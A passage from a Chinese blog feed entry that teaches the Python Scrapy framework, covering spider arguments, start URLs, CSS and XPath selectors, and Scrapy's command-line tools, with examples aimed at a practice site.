参数格式定义好参数，如下：def start_requests(self):    url = &apos;http://lab.scrapyd.cn/&apos;    tag = getattr(self, &apos;tag&apos;, None)  # 获取tag值，也就是爬取时传过来的参数    if tag is not None:  # 判断是否存在tag，若存在，重新构造url        url = url + &apos;tag/&apos; + tag  # 构造url若tag=爱情，url= &quot;http://lab.scrapyd.cn/tag/爱情&quot;    yield scrapy.Request(url, self.parse)  # 发送请求爬取参数内容可以看到   tag = getattr(self, &apos;tag&apos;, None)  就是获取传过来的参数，然后根据不同的参数，构造不同的url，然后进行不同的爬取，经过这么一个处理，我们的蜘蛛就灰常的灵活了，我们来看一下完整代码：# -*- coding: utf-8 -*-import scrapyclass ArgsspiderSpider(scrapy.Spider):        name = &quot;argsSpider&quot;        def start_requests(self):            url = &apos;http://lab.scrapyd.cn/&apos;            tag = getattr(self, &apos;tag&apos;, None)  # 获取tag值，也就是爬取时传过来的参数            if tag is not None:  # 判断是否存在tag，若存在，重新构造url                url = url + &apos;tag/&apos; + tag  # 构造url若tag=爱情，url= &quot;http://lab.scrapyd.cn/tag/爱情&quot;            yield scrapy.Request(url, self.parse)  # 发送请求爬取参数内容        &quot;&quot;&quot;        以下内容为上一讲知识，若不清楚具体细节，请查看上一讲！        &quot;&quot;&quot;        def parse(self, response):            mingyan = response.css(&apos;div.quote&apos;)            for v in mingyan:                text = v.css(&apos;.text::text&apos;).extract_first()                tags = v.css(&apos;.tags .tag::text&apos;).extract()                tags = &apos;,&apos;.join(tags)                fileName = &apos;%s-语录.txt&apos; % tags                with open(fileName, &quot;a+&quot;) as f:                    f.write(text)                    f.write(&apos;\n&apos;)                    f.write(&apos;标签：&apos; + tags)                    f.write(&apos;\n-------\n&apos;)                    f.close()            next_page = response.css(&apos;li.next a::attr(href)&apos;).extract_first()            if next_page is not None:                next_page = response.urljoin(next_page)                yield scrapy.Request(next_page, callback=self.parse)要如何传参,可以这样：scrapy crawl argsSpider -a tag=爱情</code></pre><h3 id="详解scrapy"><a href="#详解scrapy" class="headerlink" title="详解scrapy"></a>详解scrapy</h3><h4 id="scrapy如何打开页面"><a href="#scrapy如何打开页面" class="headerlink" title="scrapy如何打开页面"></a>scrapy如何打开页面</h4><pre><code>那蜘蛛要发送请求，那总得要有请求链接，如果木有，蜘蛛肯定得不到返回，那页面也就打不开了，因此引出了scrapy spiders的第一个必须的常量：start_urlsURL有两种写法，一种作为类的常量、一种作为start_requests(self)方法的常量，无论哪一种写法，URL都是必须的！有了URL那就可以发送请求了，如果URL是定义在start_request(self)这个方法里面，那我们就要使用： yield scrapy.Request 方法发送请求：如下：import scrapyclass simpleUrl(scrapy.Spider):    name = &quot;simpleUrl&quot;    # 另外一种初始链接写法    def start_requests(self):         urls = [ #爬取的链接由此方法通过下面链接爬取页面             &apos;http://lab.scrapyd.cn/page/1/&apos;,             &apos;http://lab.scrapyd.cn/page/2/&apos;,         ]         for url in urls:            #发送请求             yield scrapy.Request(url=url, callback=self.parse)这样写的一个麻烦之处就是我们需要处理我们的返回，也就是我们还需要写一个callback方法来处理response；因此大多数我们都是把URL作为类的常量，然后再加上另外一个方法： parse(response)使用这个方法来发送请求，可以看到里面有个参数已经是：response（返回），也就是说这个方法自动化的完成了：request（请求页面）-response（返回页面）的过程，我们就不必要再写函数接受返回import scrapyclass simpleUrl(scrapy.Spider):    name = &quot;simpleUrl&quot;    start_urls = [  #另外一种写法，无需定义start_requests方法        &apos;http://lab.scrapyd.cn/page/1/&apos;,        &apos;http://lab.scrapyd.cn/page/2/&apos;,    ]    def parse(self, response):        page = response.url.split(&quot;/&quot;)[-2]        filename = &apos;mingyan-%s.html&apos; % page        with open(filename, &apos;wb&apos;) as f:            f.write(response.body)        self.log(&apos;保存文件: %s&apos; % filename)</code></pre><h4 id="scrapy-css选择器"><a href="#scrapy-css选择器" class="headerlink" title="scrapy css选择器"></a>scrapy css选择器</h4><pre><code>和scrapy相关的函数就这么三个而已：response.css(&quot;css表达式&quot;)、extract()、extract_first()。有变化的就是：css表达式的写法,按照HTML标签的结构可以分为：标签属性值提取、标签内容提取1. 标签属性值的提取 提取属性是用：“标签名::attr(属性名)”，首先找到要提取的标签最近的class或id，缩小范围！比如我们要提取url表达式就是：a::attr(href)，要提取图片地址的表达式就是：img::attr(src)限定一下提取的范围，最好的方法就是找到要提取目标最近的class或是id，可以看到这段代码中有个class=&quot;page-navigator&quot;，那我们就可以这样来写：response.css(&quot;.page-navigator a::attr(href)&quot;).extract()说明：.page-navigator，其中点代表class选择器，如果代码中是：id=“page-navigator”，那我们这里就要写成：“#page-navigator”2. 标签内容的提取提取标签内容是用：“::text”含有嵌套标签文字的提取：response.css(&quot;.post-content *::text&quot;).extract()可以看到，“::tex“t前面有个“*”号，表示当前class或id下所有标签3. CSS 高级用法CSS选择器用于选择你想要的元素的样式的模式。&quot;CSS&quot;列表示在CSS版本的属性定义（CSS1，CSS2，或对CSS3）</code></pre><p><img src="https://i.imgur.com/og423tA.png" alt></p><h4 id="scrapy-xpath选择器"><a href="#scrapy-xpath选择器" class="headerlink" title="scrapy xpath选择器"></a>scrapy xpath选择器</h4><pre><code>从几个方面说：一、属性提取；二、内容提取；三、标签内包含标签又包含标签的最外层标签里的所有内容提取；1. scrapy xpath 属性提取XPath 使用路径表达式在 XML 文档中选取节点。节点是通过沿着路径或者 step 来选取的。 下面列出了最有用的路径表达式：</code></pre><p><img src="https://i.imgur.com/lBSiyp1.png" alt></p><pre><code>调试的话我们还是在命令行使用下面命令：scrapy shell lab.scrapyd.cn函数：response.xpath(&quot;表达式&quot;)，提取属性的话既然使用：@，那我们要提取href就是：@href，试一下：response.xpath(&quot;//@href&quot;)限定我们的属性，使用的是：标签[@属性名=&apos;属性值&apos;]；表达式就是：//@属性名，缩小标签范围、限定属性的方式2. scrapy xpath 标签内容提取表达式为：//text() 3. 包含HTML标签的所有文字内容提取这种用法主要是提取一些内容页，标签里夹杂着文字，但我们只要文字！比如下面的这段代码：&lt;div class=&quot;post-content&quot; itemprop=&quot;articleBody&quot;&gt;   &lt;p&gt;如果你因失去了太阳而流泪，那么你也将失去群星了。    &lt;br&gt;If you shed tears when you miss the sun, you also miss the stars.    &lt;/p&gt;   &lt;p&gt;&lt;a href=&quot;http://www.scrapyd.cn&quot;&gt;scrapy中文网（&lt;/a&gt;&lt;a href=&quot;http://www.scrapyd.cn&quot;&gt;http://www.scrapyd.cn&lt;/a&gt;）整理&lt;/p&gt;        &lt;/div&gt;如果我们用表达式：//div[@class=&apos;post-content&apos;]//text()，你会发现虽然能提取但是一个列表，不是整段文字。那就用到一个xpath函数：string()，可以把表达式这样写：response.xpath(&quot;string(//div[@class=&apos;post-content&apos;])&quot;).extract()，可看到我们没有使用：text()，而是用：string(要提取内容的标签)，这样的话就能把数据都提取出来了，而且都合成为一条，并非一个列表。这一种用法在我们提取商品详情、小说内容的时候经常用到4. xpath实例</code></pre><p><img src="https://i.imgur.com/x5llaYF.png" alt></p><h3 id="scrapy命令行工具"><a href="#scrapy命令行工具" class="headerlink" title="scrapy命令行工具"></a>scrapy命令行工具</h3><pre><code>1. scrapy全局命令scrapy startproject project_namescrapy genspider example example.com (cd project_name)scrapy crawl XX（运行XX蜘蛛）scrapy shell www.example.com(1)startproject创建项目的，如，创建一个名为：scrapyChina的项目：scrapy strartproject scrapychina(2)genspider根据蜘蛛模板创建蜘蛛的命令(3)settingsscray设置参数,比如我们想得到蜘蛛的下载延迟，我们可以使用：scrapy settings --get DOWNLOAD_DELAY;比如我们想得到蜘蛛的名字：scrapy settings --get BOT_NAME(4)runspider运行蜘蛛除了使用：scrapy crawl XX之外，我们还能用：runspider，前者是基于项目运行，后者是基于文件运行，也就是说你按照scrapy的蜘蛛格式编写了一个py文件，那你不想创建项目，那你就可以使用runspider，比如你编写了一个：scrapyd_cn.py的蜘蛛，你要直接运行就是：scrapy runspider scrapy_cn.py(5)shell主要是调试用(6)fetch模拟蜘蛛下载页面，也就是说用这个命令下载的页面就是蜘蛛运行时下载的页面，好处是能准确诊断出，得到的html结构到底是不是我们所看到的，然后能及时调整我们编写爬虫的策略。演示window下如下如何把下载的页面保存：scrapy fetch http://www.scrapyd.cn &gt;d:/3.html(7)view和fetch类似都是查看蜘蛛看到的是否和你看到的一致，便于排错，用法：scrapy view http://www.scrapyd.cn(8)version查看scrapy版本，用法：scrapy version2. scrapy项目命令需要在项目文件夹下面打开CMD命令，然后再执行下面的这些命令(1)crawl运行蜘蛛(2)check检查蜘蛛(3)list显示有多少个蜘蛛,这里的蜘蛛就是指spider文件夹下面xx.py文件中定义的name，你有10个py文件但是只有一个定义了蜘蛛的name，那只算一个蜘蛛</code></pre><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 14:31:58 GMT+0800 (GMT+08:00) --&gt;&lt;h3 id=&quot;scrapy是什么&quot;&gt;&lt;a href=&quot;#scrapy是什么&quot; class=&quot;headerlink&quot; title=&quot;scrapy是什么&quot;&gt;&lt;/a&gt;scrapy是什么&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;Scrapy 是用 Python 实现的一个为了爬取网站数据、提取结构性数据而编写的应用框架。常应用在包括数据挖掘，信息处理或存储历史数据等一系列的程序中。通常我们可以很简单的通过 Scrapy 框架实现一个爬虫，抓取指定网站的内容或图片。
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;scrapy架构图&quot;&gt;&lt;a href=&quot;#scrapy架构图&quot; class=&quot;headerlink&quot; title=&quot;scrapy架构图&quot;&gt;&lt;/a&gt;scrapy架构图&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;绿线是数据流向
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/RpWDwoz.png&quot; alt&gt;&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Scrapy Engine(引擎): 负责Spider、ItemPipeline、Downloader、Scheduler中间的通讯，信号、数据传递等。
Scheduler(调度器): 它负责接受引擎发送过来的Request请求，并按照一定的方式进行整理排列，入队，当引擎需要时，交还给引擎。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="Python" scheme="https://yongnights.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://yongnights.github.io/tags/Python/"/>
    
      <category term="Scrapy" scheme="https://yongnights.github.io/tags/Scrapy/"/>
    
  </entry>
  
</feed>
